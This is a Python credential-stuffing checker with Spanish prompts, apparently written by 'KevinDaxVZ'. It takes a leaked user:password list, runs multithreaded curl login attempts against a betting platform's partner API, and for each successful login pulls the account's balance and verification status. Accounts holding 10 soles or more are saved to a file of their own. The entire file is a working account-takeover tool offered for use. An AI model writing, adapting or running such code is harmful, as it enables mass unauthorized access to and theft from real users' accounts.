#!/bin/python3
#AUTOR: KevinDaxVZ

import os
import subprocess
import json
import tempfile
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor
import sys


def limpiar_pantalla():
    if sys.platform.lower() == 'linux':
        return 'clear'

    else:
        return 'cls'


def get_processed_logins():
    try:
        with open('processed_logins.txt', 'r') as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()


def filter_logins(logins, processed_logins):
    filtered_logins = []
    for login in logins:
        if len(login) == 2 and f"{login[0]}:{login[1]}" not in processed_logins:
            filtered_logins.append(login)

    return filtered_logins

def write_to_file(filename, text):
    with open(filename, 'a') as f:
        f.write(text)


def main():
    os.system(limpiar_pantalla())
    credenciales = input('Ingresa el nombre de tu archivo de credenciales: ')
    num_bots = int(input("Por favor, introduce el número de bots: "))

    with open(credenciales, 'r', encoding='utf-8') as txt:
        logins = [linea.rstrip('\n').split(':') for linea in txt]

    processed_logins = get_processed_logins()
    logins = filter_logins(logins, processed_logins)


    with ThreadPoolExecutor(max_workers=num_bots) as executor:
        executor.map(mini_bullet, logins)


def mini_bullet(logins):
    var1, var2 = logins

    try:
        comando = ['curl', "https://publicapiv2.virtualplay.co/partner_api/Lobby/Api", '-H',
                   "Content-Type: application/json", '-d',
                   '{"command":"login",'
                   '"params":{'
                   f'"username":"{var1}",'
                   f'"password":"{var2}",'
                   '"timeRequest":true,'
                   '"site_id":"0",'
                   '"isMobile":"",'
                   '"country":"pe",'
                   '"vs_utm_campaign2":"undefined_undefined",'
                   '"vs_utm_campaign":"APUESTASFREE_AFREE-HOME",'
                   '"vs_utm_source":"Afiliados"},'
                   '"rid":"15718498520568"}']

        with open(os.devnull, 'wb') as null:
            with tempfile.NamedTemporaryFile(delete=False, mode='w+', encoding='utf-8') as temp_file:
                subprocess.run(comando, stderr=null, stdout=temp_file)
                temp_file.close()

                with open(temp_file.name, 'r', encoding='utf-8') as f:
                    resultado = f.read()

                resultado_json = json.loads(resultado)
            os.remove(temp_file.name)

        if resultado_json["code"] == 12:
            print(f'{Fore.RED}{var1}: {var2} <----------- {resultado_json["msg"]}')



        elif resultado_json["code"] == 0:
            token = resultado_json["data"]["auth_token"]
            comando = ['curl',"https://publicapiv2.virtualplay.co/partner_api/Lobby/Api",'-H',f"Swarm-Session: {token}",
                       '-H',"Content-Type: application/json",'-d',
                       '{"command":"get","params":{"source":"user","subscribe":true,"what":{"profile":[]},"site_id":"0","isMobile":"","country":"pe","vs_utm_campaign2":"undefined_undefined","vs_utm_campaign":"undefined_undefined"},"rid":"15718498520568"}']

            with open(os.devnull, 'wb') as null:
                with tempfile.NamedTemporaryFile(delete=False, mode='w+', encoding='utf-8') as temp_file:
                    subprocess.run(comando, stderr=null, stdout=temp_file)
                    temp_file.close()

                    with open(temp_file.name, 'r', encoding='utf-8') as f:
                        resultado = f.read()

                    resultado_json = json.loads(resultado)
                os.remove(temp_file.name)

            id_user = list(resultado_json['data']['data']['profile'].keys())[0]

            moneda = resultado_json['data']['data']['profile'][id_user]["currency_name"]
            saldo = resultado_json['data']['data']['profile'][id_user]["balance"]
            verificado = resultado_json['data']['data']['profile'][id_user]["is_verified"]

            if moneda.lower == 'pen' and float(saldo) >= 10:
                print(f'{Fore.GREEN}{var1}: {var2} <----------- [{moneda}]: {saldo}\t-  verificado: {verificado}')
                write_to_file('mayor10soles.txt',f'{var1}: {var2} <----------- [{moneda}]: {saldo}\t-  verificado: {verificado}\n')

            else:
                print(f'{Fore.BLUE}{var1}: {var2} <----------- [{moneda}]: {saldo}\t-  verificado: {verificado}')
                write_to_file('login_successful.txt',f'{var1}: {var2} <----------- [{moneda}]: {saldo}\t-  verificado: {verificado}\n')



        write_to_file('processed_logins.txt',f'{var1}:{var2}\n')

    except:
        print(f'{Fore.YELLOW}{var1}: {var2} <-----------  ESTA DEMORANDO LA SOLICITUD o OCURRIO UN ERROR CON TUS CREDENCIALES')
        write_to_file('error_logins.txt', f'{var1}:{var2}\n')

if __name__ == '__main__':
    main()
